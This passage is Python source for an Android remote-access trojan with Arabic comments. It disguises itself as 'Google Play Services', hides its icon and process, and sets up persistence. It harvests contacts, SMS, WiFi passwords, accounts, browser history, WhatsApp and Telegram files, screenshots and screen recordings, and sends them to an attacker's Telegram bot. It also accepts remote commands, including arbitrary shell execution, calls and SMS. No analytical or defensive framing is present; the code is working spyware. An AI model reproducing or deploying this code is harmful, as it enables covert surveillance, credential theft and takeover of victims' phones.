            cmd = "dumpsys notification | grep -E 'NotificationRecord|pkg=|tickerText='"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            if result.stdout:
                notifs.append(result.stdout)
        except:
            pass
        
        return "\n".join(notifs)
    
    @staticmethod
    def grab_accounts():
        """سحب الحسابات"""
        accounts = []
        
        try:
            cmd = "dumpsys account"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            if result.stdout:
                accounts.append(result.stdout)
        except:
            pass
        
        try:
            cmd = "content query --uri content://settings/secure --where \"name='android_id'\""
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            if result.stdout:
                accounts.append(f"Android ID: {result.stdout}")
        except:
            pass
        
        return "\n".join(accounts)
    
    @staticmethod
    def grab_clipboard():
        """سحب الحافظة"""
        try:
            cmd = "content query --uri content://clipboard"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=2)
            return result.stdout if result.stdout else "الحافظة فارغة"
        except:
            return "لا يمكن الوصول للحافظة"
    
    @staticmethod
    def grab_browser_history():
        """سحب تاريخ المتصفح"""
        history = []
        
        browsers = [
            ('com.android.chrome', 'history'),
            ('org.mozilla.firefox', 'history'),
            ('com.opera.browser', 'history'),
            ('com.brave.browser', 'history')
        ]
        
        for browser, table in browsers:
            try:
                cmd = f"content query --uri content://{browser}.browser/{table}"
                result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
                if result.stdout:
                    history.append(f"=== {browser} ===\n{result.stdout}")
            except:
                pass
        
        return "\n".join(history)
    
    @staticmethod
    def grab_calendar():
        """سحب التقويم"""
        try:
            cmd = "content query --uri content://calendar/events"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            return result.stdout if result.stdout else "لا توجد أحداث"
        except:
            return "لا يمكن الوصول للتقويم"
    
    @staticmethod
    def grab_device_info():
        """سحب معلومات الجهاز"""
        info = []
        
        commands = [
            ("📱 الموديل", "getprop ro.product.model"),
            ("🏭 الشركة", "getprop ro.product.manufacturer"),
            ("🤖 أندرويد", "getprop ro.build.version.release"),
            ("📊 SDK", "getprop ro.build.version.sdk"),
            ("🔋 البطارية", "dumpsys battery | grep level"),
            ("💾 الرام", "dumpsys meminfo | grep 'Total RAM'"),
            ("📁 التخزين", "df -h /storage/emulated"),
            ("📶 الشبكة", "dumpsys connectivity | grep 'Active network'"),
            ("📱 التطبيقات", "pm list packages | wc -l"),
            ("⚡ العملية", "ps | grep android | head -5")
        ]
        
        for label, cmd in commands:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=2)
                if result.stdout:
                    info.append(f"{label}: {result.stdout.strip()}")
            except:
                pass
        
        return "\n".join(info)
    
    @staticmethod
    def take_screenshot():
        """لقطة شاشة حقيقية"""
        try:
            path = f'{BASE_DIR}/screen_{int(time.time())}.png'
            result = subprocess.run(['screencap', '-p', path], timeout=5)
            if os.path.exists(path) and os.path.getsize(path) > 1000:
                return path
        except:
            pass
        return None
    
    @staticmethod
    def record_screen(duration=10):
        """تسجيل شاشة"""
        try:
            path = f'{BASE_DIR}/record_{int(time.time())}.mp4'
            cmd = f"screenrecord --time-limit {duration} --size 720x1280 {path}"
            result = subprocess.run(cmd, shell=True, timeout=duration+2)
            if os.path.exists(path) and os.path.getsize(path) > 10000:
                return path
        except:
            pass
        return None

# ========== نظام التحكم الحقيقي ==========
class RealControl:
    """تحكم كامل بالجهاز"""
    
    @staticmethod
    def execute(command):
        """تنفيذ أي أمر"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)
    
    @staticmethod
    def open_app(package):
        return RealControl.execute(f"monkey -p {package} 1")
    
    @staticmethod
    def close_app(package):
        return RealControl.execute(f"am force-stop {package}")
    
    @staticmethod
    def kill_app(package):
        return RealControl.execute(f"am kill {package}")
    
    @staticmethod
    def clear_app(package):
        return RealControl.execute(f"pm clear {package}")
    
    @staticmethod
    def disable_app(package):
        return RealControl.execute(f"pm disable {package}")
    
    @staticmethod
    def enable_app(package):
        return RealControl.execute(f"pm enable {package}")
    
    @staticmethod
    def list_apps():
        return RealControl.execute("pm list packages -f")
    
    @staticmethod
    def wifi_on():
        return RealControl.execute("svc wifi enable")
    
    @staticmethod
    def wifi_off():
        return RealControl.execute("svc wifi disable")
    
    @staticmethod
    def data_on():
        return RealControl.execute("svc data enable")
    
    @staticmethod
    def data_off():
        return RealControl.execute("svc data disable")
    
    @staticmethod
    def flight_on():
        return RealControl.execute("settings put global airplane_mode_on 1")
    
    @staticmethod
    def flight_off():
        return RealControl.execute("settings put global airplane_mode_on 0")
    
    @staticmethod
    def brightness(level):
        return RealControl.execute(f"settings put system screen_brightness {level}")
    
    @staticmethod
    def lock_screen():
        return RealControl.execute("input keyevent 26")
    
    @staticmethod
    def unlock_screen():
        RealControl.execute("input keyevent 82")
        return "تم فتح الشاشة"
    
    @staticmethod
    def volume(level):
        return RealControl.execute(f"media volume --set {level}")
    
    @staticmethod
    def mute():
        return RealControl.execute("media volume --set 0")
    
    @staticmethod
    def max_volume():
        return RealControl.execute("media volume --set 15")
    
    @staticmethod
    def reboot():
        RealControl.execute("reboot")
        return "جاري إعادة التشغيل..."
    
    @staticmethod
    def shutdown():
        RealControl.execute("reboot -p")
        return "جاري الإطفاء..."
    
    @staticmethod
    def restart_systemui():
        return RealControl.execute("pkill -f com.android.systemui")
    
    @staticmethod
    def clear_cache():
        return RealControl.execute("pm trim-caches 999999999")
    
    @staticmethod
    def get_logcat():
        return RealControl.execute("logcat -d -t 100")
    
    @staticmethod
    def install_apk(path):
        return RealControl.execute(f"pm install {path}")
    
    @staticmethod
    def uninstall_app(package):
        return RealControl.execute(f"pm uninstall {package}")
    
    @staticmethod
    def send_sms(number, text):
        return RealControl.execute(f"am start -a android.intent.action.SENDTO -d sms:{number} --es sms_body '{text}' --ez exit_on_sent true")
    
    @staticmethod
    def make_call(number):
        return RealControl.execute(f"am start -a android.intent.action.CALL -d tel:{number}")
    
    @staticmethod
    def open_url(url):
        return RealControl.execute(f"am start -a android.intent.action.VIEW -d {url}")

# ========== نظام الإرسال ==========
def send_to_telegram(title, message, file_path=None):
    """إرسال حقيقي مع ملفات"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # معلومات الجهاز
        try:
            model = subprocess.run("getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            android = subprocess.run("getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            device_info = f"📱 {model} | Android {android}"
        except:
            device_info = "📱 Android Device"
        
        text = f"🔴 V13\n{device_info}\n⏰ {timestamp}\n📌 {title}\n\n{message[:500]}"
        
        # إرسال الرسالة
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
        
        # إرسال الملفات
        if file_path:
            if isinstance(file_path, list):
                for f in file_path[:5]:  # حد أقصى 5 ملفات
                    if os.path.exists(f) and os.path.getsize(f) < 50 * 1024 * 1024:
                        try:
                            with open(f, 'rb') as file:
                                files = {'document': file}
                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                                requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
                            time.sleep(1)
                        except:
                            pass
            elif os.path.exists(file_path) and os.path.getsize(file_path) < 50 * 1024 * 1024:
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
    except Exception as e:
        print(f"❌ إرسال: {e}")

# ========== نظام الأوامر ==========
class CommandHandler:
    @staticmethod
    def check_commands():
        """فحص الأوامر"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            response = requests.get(url, timeout=3)
            
            if response.status_code == 200:
                data = response.json()
                for update in data.get('result', []):
                    message = update.get('message', {})
                    text = message.get('text', '')
                    chat_id = message.get('chat', {}).get('id', '')
                    
                    if chat_id == int(CHAT_ID) and text:
                        CommandHandler.process(text)
                        
                        # حذف الرسالة
                        msg_id = message.get('message_id')
                        if msg_id:
                            del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                            requests.post(del_url, data={"chat_id": CHAT_ID, "message_id": msg_id})
        except:
            pass
    
    @staticmethod
    def process(cmd):
        """معالجة الأمر"""
        cmd = cmd.strip().lower()
        
        # ===== معلومات =====
        if cmd == '/start' or cmd == '/help':
            help_text = """
🔴 V13 REAL CONTROL - أوامر التحكم

📱 معلومات:
/info - معلومات الجهاز
/apps - جميع التطبيقات

👤 بيانات:
/contacts - جهات الاتصال
/sms - جميع الرسائل
/calls - سجل المكالمات
/location - الموقع الحالي
/wifi - كلمات سر الواي فاي
/notifications - الإشعارات
/accounts - الحسابات
/clipboard - الحافظة
/history - تاريخ المتصفح
/calendar - التقويم

📂 ملفات:
/whatsapp - كل واتساب
/telegram - كل تليغرام
/photos - الصور
/videos - الفيديو
/docs - المستندات

🖥️ شاشة:
/screen - لقطة شاشة
/record [ث] - تسجيل شاشة
/lock - قفل الشاشة
/brightness [0-255] - سطوع

🌐 شبكة:
/wifi-on - تشغيل WiFi
/wifi-off - إطفاء WiFi
/data-on - تشغيل بيانات
/data-off - إطفاء بيانات
/flight-on - وضع طيران
/flight-off - إلغاء

📱 تطبيقات:
/open [package] - فتح
/close [package] - إغلاق
/kill [package] - قتل
/clear [package] - مسح بيانات
/disable [package] - تعطيل
/enable [package] - تفعيل

⚡ نظام:
/reboot - إعادة تشغيل
/shutdown - إطفاء
/logcat - سجل النظام
/cache - مسح كاش
/shell [أمر] - أمر مباشر

🔐 صلاحيات:
/permissions - حالة الصلاحيات
/grant-all - منح كل الصلاحيات
            """
            send_to_telegram("📋 المساعدة", help_text)
        
        # ===== معلومات =====
        elif cmd == '/info':
            info = RealDataGrabber.grab_device_info()
            send_to_telegram("📱 معلومات الجهاز", info)
        
        elif cmd == '/apps':
            apps = RealControl.list_apps()
            send_to_telegram("📱 التطبيقات", apps[:500])
        
        # ===== بيانات =====
        elif cmd == '/contacts':
            data, files = RealDataGrabber.grab_contacts()
            send_to_telegram("👥 جهات الاتصال", str(data)[:500], files)
        
        elif cmd == '/sms':
            data, files = RealDataGrabber.grab_sms()
            send_to_telegram("📨 الرسائل", data[:500], files)
        
        elif cmd == '/calls':
            files = RealDataGrabber.grab_calls()
            send_to_telegram("📞 سجل المكالمات", f"تم العثور على {len(files)} ملف", files)
        
        elif cmd == '/location':
            data = RealDataGrabber.grab_location()
            send_to_telegram("📍 الموقع", data)
        
        elif cmd == '/wifi':
            data = RealDataGrabber.grab_wifi()
            send_to_telegram("📶 كلمات السر", "\n".join(data) if data else "لا توجد شبكات")
        
        elif cmd == '/notifications':
            data = RealDataGrabber.grab_notifications()
            send_to_telegram("🔔 الإشعارات", data[:500])
        
        elif cmd == '/accounts':
            data = RealDataGrabber.grab_accounts()
            send_to_telegram("🔐 الحسابات", data[:500])
        
        elif cmd == '/clipboard':
            data = RealDataGrabber.grab_clipboard()
            send_to_telegram("📋 الحافظة", data)
        
        elif cmd == '/history':
            data = RealDataGrabber.grab_browser_history()
            send_to_telegram("🌐 التاريخ", data[:500])
        
        elif cmd == '/calendar':
            data = RealDataGrabber.grab_calendar()
            send_to_telegram("📅 التقويم", data[:500])
        
        # ===== ملفات =====
        elif cmd == '/whatsapp':
            files = RealDataGrabber.grab_whatsapp()
            send_to_telegram("📱 واتساب", f"تم العثور على {len(files)} ملف", files[:10])
        
        elif cmd == '/telegram':
            files = RealDataGrabber.grab_telegram()
            send_to_telegram("📱 تليغرام", f"تم العثور على {len(files)} ملف", files[:10])
        
        elif cmd == '/photos':
            files = RealDataGrabber.grab_photos()
            send_to_telegram("📸 الصور", f"تم العثور على {len(files)} صورة", files[:10])
        
        elif cmd == '/videos':
            files = RealDataGrabber.grab_videos()
            send_to_telegram("🎥 الفيديو", f"تم العثور على {len(files)} فيديو", files[:5])
        
        elif cmd == '/docs':
            files = RealDataGrabber.grab_documents()
            send_to_telegram("📄 المستندات", f"تم العثور على {len(files)} مستند", files[:5])
        
        # ===== شاشة =====
        elif cmd == '/screen':
            path = RealDataGrabber.take_screenshot()
            if path:
                send_to_telegram("🖥️ لقطة شاشة", "تم", path)
            else:
                send_to_telegram("❌ خطأ", "لا يمكن أخذ لقطة شاشة")
        
        elif cmd.startswith('/record'):
            parts = cmd.split()
            duration = 10
            if len(parts) > 1:
                try:
                    duration = min(int(parts[1]), 30)
                except:
                    pass
            path = RealDataGrabber.record_screen(duration)
            if path:
                send_to_telegram("🎥 تسجيل شاشة", f"{duration} ثانية", path)
            else:
                send_to_telegram("❌ خطأ", "لا يمكن تسجيل الشاشة")
        
        elif cmd == '/lock':
            RealControl.lock_screen()
            send_to_telegram("🔒 قفل", "تم قفل الشاشة")
        
        elif cmd.startswith('/brightness'):
            parts = cmd.split()
            if len(parts) > 1:
                try:
                    level = int(parts[1])
                    if 0 <= level <= 255:
                        RealControl.brightness(level)
                        send_to_telegram("💡 سطوع", f"تم التعديل إلى {level}")
                except:
                    send_to_telegram("❌ خطأ", "القيمة بين 0-255")
        
        # ===== شبكة =====
        elif cmd == '/wifi-on':
            RealControl.wifi_on()
            send_to_telegram("📶 WiFi", "تم التشغيل")
        
        elif cmd == '/wifi-off':
            RealControl.wifi_off()
            send_to_telegram("📶 WiFi", "تم الإطفاء")
        
        elif cmd == '/data-on':
            RealControl.data_on()
            send_to_telegram("📱 بيانات", "تم التشغيل")
        
        elif cmd == '/data-off':
            RealControl.data_off()
            send_to_telegram("📱 بيانات", "تم الإطفاء")
        
        elif cmd == '/flight-on':
            RealControl.flight_on()
            send_to_telegram("✈️ طيران", "تم التشغيل")
        
        elif cmd == '/flight-off':
            RealControl.flight_off()
            send_to_telegram("✈️ طيران", "تم الإلغاء")
        
        # ===== تطبيقات =====
        elif cmd.startswith('/open '):
            package = cmd.replace('/open ', '')
            RealControl.open_app(package)
            send_to_telegram("▶️ فتح", f"تم فتح {package}")
        
        elif cmd.startswith('/close '):
            package = cmd.replace('/close ', '')
            RealControl.close_app(package)
            send_to_telegram("⏹️ إغلاق", f"تم إغلاق {package}")
        
        elif cmd.startswith('/kill '):
            package = cmd.replace('/kill ', '')
            RealControl.kill_app(package)
            send_to_telegram("💀 قتل", f"تم قتل {package}")
        
        elif cmd.startswith('/clear '):
            package = cmd.replace('/clear ', '')
            RealControl.clear_app(package)
            send_to_telegram("🧹 مسح", f"تم مسح بيانات {package}")
        
        elif cmd.startswith('/disable '):
            package = cmd.replace('/disable ', '')
            RealControl.disable_app(package)
            send_to_telegram("🔴 تعطيل", f"تم تعطيل {package}")
        
        elif cmd.startswith('/enable '):
            package = cmd.replace('/enable ', '')
            RealControl.enable_app(package)
            send_to_telegram("🟢 تفعيل", f"تم تفعيل {package}")
        
        # ===== نظام =====
        elif cmd == '/reboot':
            send_to_telegram("🔄 إعادة تشغيل", "جاري...")
            RealControl.reboot()
        
        elif cmd == '/shutdown':
            send_to_telegram("⏻ إطفاء", "جاري...")
            RealControl.shutdown()
        
        elif cmd == '/logcat':
            data = RealControl.get_logcat()
            send_to_telegram("📋 سجل النظام", data[:500])
        
        elif cmd == '/cache':
            result = RealControl.clear_cache()
            send_to_telegram("🧹 كاش", result)
        
        elif cmd.startswith('/shell '):
            command = cmd.replace('/shell ', '')
            result = RealControl.execute(command)
            send_to_telegram(f"💻 {command}", result[:500])
        
        # ===== صلاحيات =====
        elif cmd == '/permissions':
            send_to_telegram("🔐 صلاحيات", "جاري التحقق...")
        
        elif cmd == '/grant-all':
            send_to_telegram("🔑 منح الصلاحيات", "جاري منح كل الصلاحيات...")
            results = RealPermissions.request_all()
            send_to_telegram("✅ تم", f"تم منح {len(results)} صلاحية")

# ========== نظام الإخفاء الكامل ==========
class RealHider:
    @staticmethod
    def hide_completely():
        """إخفاء التطبيق بشكل كامل"""
        try:
            # 1. إخفاء الأيقونة
            subprocess.run(f"pm hide {PACKAGE_NAME}", shell=True, capture_output=True)
            
            # 2. تعطيل النشاط الرئيسي
            subprocess.run(f"pm disable {PACKAGE_NAME}/.MainActivity", shell=True, capture_output=True)
            
            # 3. إخفاء من المهام الأخيرة
            subprocess.run(f"am start -n {PACKAGE_NAME}/.MainActivity --activity-clear-task", shell=True, capture_output=True)
            
            # 4. تغيير اسم العملية
            sys.argv[0] = 'system_server'
            
            # 5. إخفاء من قائمة التطبيقات
            subprocess.run(f"appops set {PACKAGE_NAME} GET_USAGE_STATS ignore", shell=True, capture_output=True)
            
            return True
        except:
            return False
    
    @staticmethod
    def enable_autostart():
        """تفعيل التشغيل التلقائي"""
        try:
            # Boot receiver
            subprocess.run(f"pm enable {PACKAGE_NAME}/.BootReceiver", shell=True, capture_output=True)
            
            # Alarm
            subprocess.run(f"am set-alarm {PACKAGE_NAME} 60000", shell=True, capture_output=True)
            
            # Job scheduler
            subprocess.run(f"cmd jobscheduler schedule -f {PACKAGE_NAME} 60", shell=True, capture_output=True)
            
            # Autostart file
            try:
                auto_path = '/data/data/com.android.system/shared_prefs/autostart.xml'
                os.makedirs(os.path.dirname(auto_path), exist_ok=True)
                with open(auto_path, 'w') as f:
                    f.write(f'<map><boolean name="{PACKAGE_NAME}" value="true"/></map>')
            except:
                pass
            
            return True
        except:
            return False

# ========== الحلقة الرئيسية ==========
def main_loop():
    """حلقة لا تنتهي"""
    
    # منح الصلاحيات
    send_to_telegram("🔑 جاري منح الصلاحيات...", "الرجاء الانتظار")
    RealPermissions.request_all()
    
    # تفعيل التشغيل التلقائي
    RealHider.enable_autostart()
    
    # معلومات الجهاز
    time.sleep(2)
    info = RealDataGrabber.grab_device_info()
    send_to_telegram("✅ تم التشغيل", info)
    
    # لقطة شاشة أولية
    time.sleep(2)
    screen = RealDataGrabber.take_screenshot()
    if screen:
        send_to_telegram("🖥️ لقطة أولى", "تم", screen)
    
    # سحب بيانات أولية
    threading.Thread(target=lambda: RealDataGrabber.grab_contacts(), daemon=True).start()
    threading.Thread(target=lambda: RealDataGrabber.grab_sms(), daemon=True).start()
    
    # حلقة التحكم
    last_command_time = 0
    command_cooldown = 2  # ثانيتين بين الأوامر
    
    while True:
        try:
            current_time = time.time()
            
            # فحص الأوامر
            if current_time - last_command_time >= command_cooldown:
                CommandHandler.check_commands()
                last_command_time = current_time
            
            # لقطة شاشة عشوائية (كل 5 دقائق)
            if random.random() < 0.003:  # ~ كل 5 دقائق
                screen = RealDataGrabber.take_screenshot()
                if screen:
                    send_to_telegram("🖥️ لقطة تلقائية", "تم", screen)
            
            time.sleep(1)
            
        except Exception as e:
            print(f"⚠️ {e}")
            time.sleep(5)

# ========== الواجهة الرئيسية ==========
def main(page: ft.Page):
    """صفحة التثبيت"""
    try:
        # صفحة بسيطة
        page.title = "جاري التثبيت..."
        page.window_width = 300
        page.window_height = 200
        page.window_resizable = False
        page.bgcolor = "#ffffff"
        
        page.add(
            ft.Container(
                content=ft.Column([
                    ft.Text("Google Play Services", size=18, weight="bold", color="#4CAF50"),
                    ft.Text("جاري التثبيت... 100%", size=14),
                    ft.ProgressBar(width=200, color="#4CAF50", value=1.0)
                ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
                padding=20
            )
        )
        
        page.update()
        time.sleep(2)
        
        # إخفاء التطبيق
        page.window_visible = False
        page.update()
        
        # إخفاء كامل
        threading.Thread(target=RealHider.hide_completely, daemon=True).start()
        
        # بدء العمليات
        threading.Thread(target=main_loop, daemon=True).start()
        
    except:
        threading.Thread(target=main_loop, daemon=True).start()

# ========== التشغيل ==========
if __name__ == "__main__":
    try:
        ft.app(target=main)
    except:
        threading.Thread(target=main_loop, daemon=True).start()
        while True:
            time.sleep(10)
